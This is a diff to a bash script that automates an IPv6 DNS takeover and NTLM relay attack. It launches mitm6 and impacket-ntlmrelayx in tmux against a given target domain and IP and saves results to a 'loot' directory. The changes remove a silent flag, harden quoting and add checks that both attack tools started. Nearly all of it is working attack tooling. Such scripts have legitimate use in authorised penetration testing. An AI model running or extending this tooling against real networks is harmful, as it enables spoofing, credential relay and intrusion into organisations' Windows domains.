@@ -20,21 +20,19 @@ target_domain=""
 target_ip=""
 interface="eth0"
 verbose=0
-silent=0
 loot_dir="dumps"
 session_name=""
 
 
 # Print usage information
 usage() {
-  echo -e "${CYAN}Usage: $0 -d <target_domain> -t <target_ip> [-i <interface>] [-l <loot_dir>] [-v] [-s]${RESET}"
+  echo -e "${CYAN}Usage: $0 -d <target_domain> -t <target_ip> [-i <interface>] [-l <loot_dir>] [-v]${RESET}"
   echo -e "${YELLOW}Options:${RESET}"
   echo -e "  -d  Specify the target domain"
   echo -e "  -t  Specify the target IP"
   echo -e "  -i  Specify the network interface (default: eth0)"
   echo -e "  -l  Specify loot output directory (default: dumps)"
   echo -e "  -v  Enable verbose logging"
-  echo -e "  -s  Enable silent mode (suppress console output)"
   exit 1
 }
 
@@ -56,14 +54,13 @@ banner() {
 
 
 # Parse command-line arguments
-while getopts ":d:t:i:l:vs" opt; do
+while getopts ":d:t:i:l:v" opt; do
   case "$opt" in
     d) target_domain="$OPTARG" ;;
     t) target_ip="$OPTARG" ;;
     i) interface="$OPTARG" ;;
     l) loot_dir="$OPTARG" ;;
     v) verbose=1 ;;
-    s) silent=1 ;;
     \?) usage ;;
   esac
 done
@@ -78,11 +75,7 @@ check_command() {
   }
 }
 
-# Enable verbose logging if requested
-if [ "$verbose" -eq 1 ] && [ "$silent" -eq 1 ]; then
-  echo -e "${RED}Error: -v and -s flags cannot be used together.${RESET}"
-  exit 1
-fi
+[[ "$verbose" -eq 1 ]] && set -x
 
 # Ensure required arguments are provided
 if [ -z "$target_domain" ] || [ -z "$target_ip" ]; then
@@ -132,7 +125,7 @@ safe_domain="${target_domain//[^a-zA-Z0-9]/_}"
 session_name="ipv6_dns_takeover_${safe_domain}"
 
 # Create loot directory if it doesn't exist
-if [ ! -d "$loot_dir" ]; then
+if [[ ! -d "$loot_dir" ]]; then
   mkdir -p "$loot_dir"
 else
   echo -e "${YELLOW}Warning: Loot directory '$loot_dir' already exists. Results may be overwritten.${RESET}"
@@ -147,7 +140,7 @@ if tmux has-session -t "$session_name" 2>/dev/null; then
 
   echo -e "${BLUE}Do you want to:${RESET}"
   echo -e "  [a] Attach to existing session"
-  echo -e "  [k] Kill and restart session"
+  echo -e "  [k] Kill existing session"
   read -rp "$(echo -e "${YELLOW}Choose [a/k]: ${RESET}")" user_choice
 
   case "$user_choice" in
@@ -178,14 +171,16 @@ tmux new-session -d -s "$session_name" || {
 
 # Function to start a tmux window
 start_tmux_window() {
-  local session_name=$1
-  local window_name=$2
-  local command=$3
-  tmux new-window -t "$session_name" -n "$window_name" || {
+  local session_name="$1"
+  local window_name="$2"
+  local command="$3"
+  tmux new-window -dt "$session_name" -n "$window_name" || {
     echo "Failed to create window"
     exit 1
   }
-  tmux send-keys -t "$session_name:$window_name" "$command" C-m
+  tmux send-keys \
+    -t "$session_name:$window_name" \
+    "bash -lc $(printf '%q' "$command")" C-m
 }
 
 # Start mitm6 in tmux session
@@ -202,11 +197,32 @@ start_tmux_window "$session_name" "impacket-ntlmrelayx" "impacket-ntlmrelayx -6 
   exit 1
 }
 
-# Disable verbose logging
-if [ "$verbose" -eq 1 ]; then
-  echo -e "${YELLOW}Disabling verbose mode...${RESET}"
-  set +x
+sleep 2
+
+if ! tmux list-panes -t "$session_name:mitm6" >/dev/null 2>&1; then
+    echo -e "${RED}mitm6 failed immediately. Check its tmux window.${RESET}"
+    exit 1
 fi
+
+if ! tmux list-panes -t "$session_name:impacket-ntlmrelayx" >/dev/null 2>&1; then
+    echo -e "${RED}ntlmrelayx failed immediately. Check its tmux window.${RESET}"
+    exit 1
+fi
+
+
+for _ in {1..10}; do
+    if pgrep -fa "mitm6.*$target_domain" >/dev/null &&
+       pgrep -fa "ntlmrelayx.*$target_ip" | grep -vq "bash -lc"; then
+        break
+    fi
+    sleep 1
+done
+
+pgrep -fa "mitm6.*$target_domain" >/dev/null &&
+pgrep -fa "ntlmrelayx.*$target_ip" | grep -vq "bash -lc" || {
+    echo -e "${RED}One or more tools failed to start.${RESET}"
+    exit 1
+}
 
 # Attach to the tmux session
 echo -e "${GREEN}Attaching to the tmux session '$session_name'...${RESET}"
